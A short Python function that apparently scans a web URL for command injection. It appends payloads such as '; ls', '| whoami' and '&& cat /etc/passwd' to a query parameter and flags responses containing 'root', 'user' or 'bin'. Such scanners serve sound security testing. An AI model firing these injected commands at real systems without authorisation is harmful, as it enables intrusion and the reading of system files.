import requests

def check(url):
    print(f"Testing Command Injection on {url}")
    payloads = ["; ls", "| whoami", "&& cat /etc/passwd"]
    for payload in payloads:
        injection_url = f"{url}?input={payload}"
        try:
            response = requests.get(injection_url)
            if any(keyword in response.text.lower() for keyword in ["root", "user", "bin"]):
                print(f"Possible Command Injection found at {injection_url}")
        except requests.RequestException as e:
            print(f"Error testing Command Injection on {url}: {e}")
